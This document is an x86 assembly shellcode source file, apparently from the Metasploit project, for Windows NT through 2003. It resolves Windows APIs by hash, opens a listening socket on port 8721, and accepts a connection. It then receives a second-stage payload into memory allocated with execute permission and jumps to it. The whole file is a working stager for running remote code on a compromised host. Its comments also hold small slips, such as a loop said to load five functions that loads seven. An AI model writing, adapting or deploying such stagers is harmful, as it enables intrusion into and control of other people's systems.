;      Title:  Win32 API Loader
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  hdm[at]metasploit.com

[BITS 32]

global _start
_start:

    call LKernel32Base

LGetProcAddress:
	push ebx
	push ebp
	push esi
	push edi
	mov ebp, [esp + 24]			
	mov eax, [ebp + 0x3c]		
	mov edx, [ebp + eax + 120]
	add edx, ebp				
	mov ecx, [edx + 24]			
	mov ebx, [edx + 32]
	add ebx, ebp

LFnlp:
	jecxz	LNtfnd
	dec ecx
	mov esi, [ebx + ecx * 4]
	add esi, ebp				
	xor edi, edi
	cld

LHshlp:
	xor eax, eax
	lodsb
	cmp al, ah
	je LFnd
	ror edi, 13
	add edi, eax
	jmp short LHshlp

LFnd:	
	cmp edi, [esp + 20]
	jnz LFnlp
	mov ebx, [edx + 36]			
	add ebx, ebp
	mov cx, [ebx + 2 * ecx]		
	mov ebx, [edx + 28]			
	add ebx, ebp
	mov eax, [ebx + 4 * ecx]	
	add eax, ebp
	jmp short LDone

LNtfnd:
	xor eax, eax

LDone:
	pop edi
	pop esi
	pop ebp
	pop ebx
	ret 8

LKernel32Base:
    pop esi
    push byte 0x30
    pop ecx
    mov ebx, [fs:ecx]
    mov ebx, [ebx + 0x0c] 
    mov ebx, [ebx + 0x14] 
    mov ebx, [ebx]		  
    mov ebx, [ebx]		  
    mov ebx, [ebx + 0x10]

    push ebx                ; kernel32.dll base
    push 0xec0e4e8e         ; LoadLibraryA
    call esi                ; GetProcAddress(kerne32.dll, LoadLibrary)
    mov edi, eax
	
    push ebx                ; kernel32.dll base
    push 0x91afca54         ; VirtualAlloc
    call esi                ; GetProcAddress(kerne32.dll, VirtualAlloc)
   
    ; ebx = kernel32.dll base
    ; esi = LGetProcAddress
    ; edi = LoadLibraryA
	; eax = VirtualAlloc

sub esp, 0x100
push eax    ; [ebp + 12] = VirtualAlloc
push edi    ; [ebp +  8] = LoadLibraryA
push esi    ; [ebp +  4] = LGetProcAddress
push ebx    ; [ebp +  0] = kernel32.dll base
            
mov ebp, esp
call LLoadWinsock

%define FN_RECV     [ebp + 24]
%define FN_CLOSE    [ebp + 28]
%define FN_ACCEPT   [ebp + 32]
%define FN_BIND     [ebp + 36]
%define FN_LISTEN   [ebp + 40]
%define FN_WSASOCK  [ebp + 44]
%define FN_WSASTART [ebp + 48]

LWSDataSegment:
;========================
dd 0x190      ; used by wsastartup
dd 0xe71819b6 ; recv        [ebp + 24]
dd 0x79c679e7 ; closesocket [ebp + 28]
dd 0x498649e5 ; accept      [ebp + 32]
dd 0xc7701aa4 ; bind        [ebp + 36]
dd 0xe92eada4 ; listen      [ebp + 40]
dd 0xadf509d9 ; WSASocketA  [ebp + 44]
dd 0x3bfcedcb ; WSAStartup  [ebp + 48]
db "ws2_32", 0x00
;========================

LLoadWinsock:
    pop ebx             ; save address to data in ebx
    lea ecx, [ebx + 32] ; find address of "WS2_32.DLL"
    push ecx            ; push address of "WS2_32.DLL"
	call edi            ; call LoadLibraryA("WS2_32.DLL")     
    mov edi, ebx        ; store base of data section in edi
    mov ebx, eax        ; store base of winsock in ebx
    lea esi, [ebp + 20] ; store base of function table
    push byte 0x07      ; load five functions by hash
    pop ecx             ; configure the counter

Looper:    
    push ecx                    ; save the counter
    push ebx                    ; dll handle
    push dword [edi + ecx * 4]  ; function hash value
    call [ebp + 4]              ; find the address
    pop ecx                     ; restore the counter
    mov [esi + ecx * 4], eax    ; stack segment to store addresses
    loop Looper

; Initialize winsock
LWSAStartup:                    ; WSAStartup (0x101, DATA)
    sub esp, [edi]
	push esp
	push dword [edi]
	call FN_WSASTART
    xor eax, eax

; Create the socket
LWSASocketA:                    ; WSASocketA (2,1,0,0,0,0) 
	push eax
	push eax
	push eax
	push eax
	inc eax
	push eax
	inc eax
	push eax
	call FN_WSASOCK
    mov edi, eax

; Bind to the specified port
LBind:
    xor ebx, ebx
    push ebx
    push ebx
    push dword 0x11220002 ; port 8721
    mov eax, esp
    push byte 0x10        ; length
    push eax
    push edi
    call FN_BIND

; Listen for new connections
LListen:
    push ebx
    push edi
    call FN_LISTEN

; Accept the client connection
LAccept:
    push ebx
    push esp
    push edi
    call FN_ACCEPT

; Close the listening socket
LClose:
    push ebx
    push edi
	mov edi, eax
	call FN_CLOSE

; VirtualAlloc(NULL,size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
LAllocateMemory: 
	push byte      0x40
	pop esi
	push esi                ; PAGE_EXECUTE_READWRITE=0x40

	shl esi, 6              ; MEM_COMMIT=0x1000
	push esi

	shl esi, 8              ; 1MB
	push esi
	
	push byte      0x00     ; NULL
	call [ebp+12]
	mov ebx, eax
	
LRecvLength: ; recv(s, buff, 4, 0)
    push byte 0x00          ; flags
    push 4096               ; length
    push ebx                ; buffer
    push dword edi          ; socket
    call FN_RECV            ; recv()

LExecuteStage:
    call ebx
